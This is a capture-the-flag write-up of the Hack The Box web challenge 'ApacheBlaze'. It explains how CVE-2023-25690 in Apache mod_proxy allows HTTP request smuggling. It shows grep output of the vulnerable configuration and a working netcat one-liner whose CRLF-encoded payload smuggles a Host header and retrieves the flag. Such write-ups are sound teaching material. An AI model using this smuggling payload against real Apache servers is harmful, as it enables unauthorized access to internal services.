# Target
|            |                                                   |
|------------|---------------------------------------------------|
| Type       | Hack The Box Challenge                            |
| Name       | ApacheBlaze                                       |
| URL        | https://app.hackthebox.com/challenges/apacheblaze |
| Category   | Web                                               |
| Difficulty | Easy                                              |

# Solution
Due to [CVE-2023-25690](https://nvd.nist.gov/vuln/detail/cve-2023-25690), some `mod_proxy` configurations allow an [HTTP Request Smuggling](https://cwe.mitre.org/data/definitions/444.html) attack. This great [POC](https://github.com/dhmosfunk/CVE-2023-25690-POC) explains all details behind this vulnerability. 

In challenge provided files we could find that vulnerable Apache HTTP Server is being used:
```
┌──(magicrc㉿perun)-[~/attack]
└─$ grep httpd- web_apacheblaze/Dockerfile
RUN wget https://archive.apache.org/dist/httpd/httpd-2.4.55.tar.gz && tar -xvf httpd-2.4.55.tar.gz
WORKDIR httpd-2.4.55
```

Additionally, to that `mod_proxy` configuration contains `RewriteRule` which makes request smuggling possible:
```
┌──(magicrc㉿perun)-[~/attack]
└─$ grep RewriteRule web_apacheblaze/conf/httpd.conf                          
    RewriteRule "^/api/games/(.*)" "http://127.0.0.1:8080/?game=$1" [P]
```

Knowing all that we will smuggle HTTP `Host` header containing required `dev.apacheblaze.local` value, which will be used by `mod_proxy` to create `'X-Forwarded-Host`:
```
┌──(magicrc㉿perun)-[~/attack]
└─$ echo -e "GET /api/games/click_topia%20HTTP/1.1%0d%0aHost:%20dev.apacheblaze.local%0d%0a%0d%0aGET%20/api/games/click_topia HTTP/1.1\r\nHost: dev.apacheblaze.local\r\n\r\n" | nc 94.237.54.190 30979
HTTP/1.1 200 OK
Date: Sun, 23 Feb 2025 08:17:21 GMT
Server: Apache
Content-Type: application/json
Content-Length: 44

{"message":"HTB{f4k3_fl4g_f0r_t3st1ng}"}
```